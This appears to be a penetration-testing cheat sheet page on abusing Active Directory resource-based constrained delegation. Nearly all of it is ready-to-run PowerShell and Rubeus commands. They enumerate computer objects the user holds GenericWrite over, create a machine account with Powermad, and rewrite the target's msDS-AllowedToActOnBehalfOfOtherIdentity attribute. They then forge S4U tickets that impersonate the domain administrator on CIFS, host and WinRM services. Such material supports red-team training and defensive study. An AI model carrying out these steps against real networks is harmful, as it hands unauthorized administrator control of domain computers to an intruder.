---
layout: page
title: "# AD Resource-Based Constrained Delegation"
permalink: /ad_cheatsheets/ad_resource_based_contrained_delegation
---

# AD Resource-Based Constrained Delegation

## Find GenericWrite ComputerAccounts

This specific vector starts by compromising a domain account that has the GenericWrite access right on a computer account object (when a computerobject use PSExec to get into computer context).

```powershell
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

## Get ms-DS-MachineAccountQuota data

Since we have GenericWrite on appsrv01, we can update any non-protected property on that object, including msDS-AllowedToActOnBehalfOfOtherIdentity and add the SID of a different computer.

Once a SID is added, we will act in the context of that computer account and we can execute the S4U2Self and S4U2Proxy extensions to obtain a TGS for appsrv01. To do this, we either have to obtain the password hash of a computer account or simply create a new computer account object with a selected password.

By default, any authenticated user can add up to ten computer accounts to the domain and they will have SPNs set automatically. This value is present in the ms-DS-MachineAccountQuota property in the Active Directory domain object.

We can enumerate ms-DS-MachineAccountQuota with the **PowerView** Get-DomainObject method:

```powershell
Get-DomainObject -Identity %DOMAIN-NAME% -Properties ms-DS-MachineAccountQuota
```

## Create a new computer account with PowerMad.ps1 and get SID

First you need to have PowerMad.ps1:

[https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1](https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1)

Now let's import and run it to create a new computeraccount:

```powershell
. .\powermad.ps1

New-MachineAccount -MachineAccount %NEW-CREATED-MACHINENAME% -Password $(ConvertTo-SecureString 'TestComputer123' -AsPlainText -Force)
```

The msDS-AllowedToActOnBehalfOfOtherIdentity property stores the SID as part of a security descriptor in a binary format. We must convert the SID of our newly-created computer object to the correct format in order to proceed with the attack. To do this, we must first create a new security descriptor with the correct SID. We can use the RawSecurityDescriptor class to instantiate a SecurityDescriptor object:

```powershell
#Define the SID of newly created computer
$sid =Get-DomainComputer -Identity %NEW-CREATED-MACHINENAME% -Properties objectsid | Select -Expand objectsid

#Create SecurityDescriptor object
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"

#convert it into a byte array to match the format for the msDS-AllowedToActOnBehalfOfOtherIdentity property:
$SDbytes = New-Object byte[] ($SD.BinaryLength)

$SD.GetBinaryForm($SDbytes,0)

#OR the above  (incl. the first below) with PowerView:
Set-ADComputer %TARGET-COMPUTER% -PrincipalsAllowedToDelegateToAccount %NEW-CREATED-MACHINENAME% -Server 172.16.75.165 -Verbose
```

## Update the msDS-AllowedToActOnBehalfOfOtherIdentity to the SID of new machine

After the SecurityDescriptor has been converted to a byte array, we can use Get-DomainComputer to obtain a handle to the computer object for appsrv01 and then pipe that into Set-DomainObject, which can update properties by specifying them with -Set options:

```powershell
Get-DomainComputer -Identity %TARGET-COMPUTER% | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

## Verify the security descriptor

```powershell
#Reading the binary version of "msdsallowedtoactonbehalfofotheridentity" with Get-DomainComputer 
$RBCDbytes = Get-DomainComputer %TARGET-COMPUTER% -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity

#Instantiating a SecurityDescriptor object with RawSecurityDescriptor
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RBCDbytes, 0

#Get SID:
$Descriptor.DiscretionaryAcl

#Convert SID:
ConvertFrom-SID S-1-5-21-2032401531-514583578-4118054891-6101
```

## Get the RC4 hash of the password used during creation of the computer account

```powershell
.\Rubeus.exe hash /password:%PASSWORD%
```

```powershell
#Call asktgt requesting a administrator ticket for service CIFS/appsrv01.prod.corp1.com and inject it into the memory:
.\Rubeus.exe s4u /user:myComputer$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:CIFS/appsrv01.prod.corp1.com /ptt

#Request multiple tickets for multiple services:
.\Rubeus.exe s4u /user:SuperMachine$ /rc4:A62289A48B2BD23C940D9E24AB05AD37 /impersonateuser:administrator /msdsspn:cifs/jump09.ops.comply.com /altservice:host,wsman,rpcss /ptt
```

*Note, we can also use the above attack vector with GenericAll, WriteProperty, or WriteDACL access rights to appsrv01.
